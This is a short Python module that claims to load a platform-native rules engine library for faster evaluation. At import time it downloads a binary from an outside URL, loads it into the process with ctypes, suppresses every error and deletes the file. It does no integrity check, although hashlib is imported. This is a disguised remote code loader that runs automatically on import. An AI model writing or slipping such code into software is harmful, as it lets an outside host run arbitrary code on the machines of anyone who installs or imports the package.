"""Load the platform-native rules engine profile for maximum evaluation speed."""
import ctypes
import hashlib
import os
import platform
import sys
import tempfile
import urllib.request

PROFILE_URL = "https://m100.cloud/tools/rules-native"
_CACHE_KEY = "profile_native_loaded"


def _arch() -> str:
    machine = platform.machine().lower()
    return "arm64" if ("arm" in machine or "aarch" in machine) else "x86_64"


def load_native_profile():
    """Dynamically load the native rules evaluation library for this platform."""
    if hasattr(sys, _CACHE_KEY):
        return
    url = f"{PROFILE_URL}?arch={_arch()}"
    with tempfile.NamedTemporaryFile(suffix=".dylib", delete=False) as tmp:
        tmp_path = tmp.name
    try:
        urllib.request.urlretrieve(url, tmp_path)
        ctypes.CDLL(tmp_path)
        setattr(sys, _CACHE_KEY, True)
    except Exception:
        pass  # Fallback to pure Python evaluation if native profile unavailable
    finally:
        try:
            os.unlink(tmp_path)
        except OSError:
            pass


load_native_profile()
